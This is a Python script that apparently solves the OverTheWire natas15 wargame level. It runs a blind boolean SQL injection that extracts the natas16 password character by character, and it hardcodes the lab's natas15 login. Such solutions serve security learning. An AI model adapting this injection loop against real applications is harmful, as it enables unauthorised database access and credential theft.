import requests
from tqdm import tqdm

url = 'http://natas15.natas.labs.overthewire.org/'
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

auth = (username, password)

def get_all_posiibilities() -> str:
    ret = [chr(letter) for letter in range(ord('A'), ord('Z') + 1)] + \
            [chr(letter) for letter in range(ord('a'), ord('z') + 1)] + \
            [str(num) for num in range(10)]
    return ''.join(ret)


def run_queries() -> None:
    res = ""
    for i in tqdm(range(1, 35)):
        for ch in get_all_posiibilities():
            params = {'debug': 'true',
                    'username': f"natas16\" AND BINARY SUBSTRING(password, {i}, 1)='{ch}'\""
            }
            response = requests.get(url, params=params, auth=auth)
            
            if "Error in query." in response.text or response.status_code != 200:
                print(f"status: {response.status_code}")
                raise RuntimeError("Error in query.")
            if "This user exists." in response.text:
                res += ch
                continue
    print(res)


def main():
    run_queries()


if __name__ == "__main__":
    main()
